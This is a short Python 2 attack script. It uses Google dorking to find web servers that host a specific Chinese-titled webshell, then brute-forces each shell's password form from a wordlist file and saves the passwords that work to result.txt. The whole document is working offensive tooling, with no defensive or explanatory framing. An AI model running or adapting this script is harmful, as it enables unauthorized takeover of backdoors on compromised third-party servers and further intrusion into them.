#!/usr/bin/env python
#coding=utf-8

import mechanize
from xgoogle.search import GoogleSearch, SearchError
import socket

passlist = []
def exploit(payload, **kwargs):
    socket.setdefaulttimeout(40)
    global passlist
    url = payload
    if not passlist:
        fs = open("shellpassword.txt")
        passlist = fs.readlines()
        fs.close() 

    for string in passlist:
        try:
            string = string.strip('\n')
            print string
            br = mechanize.Browser()
            br.open(url)
            br.select_form(nr=0)
            br["pass"] = string
            response = br.submit()
            result = response.readlines()
            if -1 == "".join(result).find('PassWord Error'):
                info = "[URL] %s [PASS] %s\n" % (url, string)
                return info
        except Exception,e:
            print e,
            return ''

    return ''

def main():
    gs = GoogleSearch('intitle:道德黑客技术论坛内部专版WEBSHELL')
    gs.results_per_page = 100
    for index in range(4):
        gs.page = index + 1
        results = gs.get_results()
        for result in results:
            url = result.getURL() 
            print result
            
            ret = exploit(url)
            if ret == '':
                continue

            open('result.txt', 'a').write(ret)

if __name__ == "__main__":
    main()
